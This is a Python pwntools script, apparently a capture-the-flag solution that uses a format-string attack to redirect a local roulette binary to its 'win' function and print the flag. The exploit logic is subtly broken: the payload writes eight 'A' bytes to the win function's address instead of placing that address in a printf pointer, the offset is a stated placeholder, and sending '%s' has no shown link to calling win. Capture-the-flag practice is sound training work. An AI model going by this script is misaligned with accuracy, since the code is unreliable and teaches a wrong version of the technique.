from pwn import *

# Set the context for the binary
context.binary = 'double_zer0_dilemma'

# Establish a connection to the binary
p = process(context.binary.path)

# Function to send a number and bet amount
def send_number_and_bet(number, bet):
    p.sendlineafter("Enter the number (0-36) you think the roulette will land on: \n", str(number))
    p.sendlineafter("Enter the amount you want to wager: \n", str(bet))

# Function to overwrite the printf function pointer
def overwrite_printf(printf_offset, win_address):
    # Construct the payload to overwrite the printf function pointer
    payload = fmtstr_payload(printf_offset, {win_address: b'A'*8}, write_size='short')
    
    # Send the payload to overwrite the printf function pointer
    send_number_and_bet(payload, 0)

# Function to trigger the win function
def trigger_win():
    # Trigger the win function by sending a format string to printf
    send_number_and_bet('%s', 0)

# Function to get the flag
def get_flag():
    # Wait for the flag to be printed
    p.recvuntil('flag: ')
    flag = p.recvline().strip()
    return flag

# Main function to solve the challenge
def solve():
    # Find the address of the win function
    win_address = context.binary.symbols['win']
    
    # Find the offset to the printf function pointer
    # This will depend on the binary's memory layout
    printf_offset = 0x18  # Example offset, you'll need to find the correct one
    
    # Overwrite the printf function pointer
    overwrite_printf(printf_offset, win_address)
    
    # Trigger the win function
    trigger_win()
    
    # Get the flag
    flag = get_flag()
    print(f'Flag: {flag}')

# Run the exploit
if __name__ == '__main__':
    solve()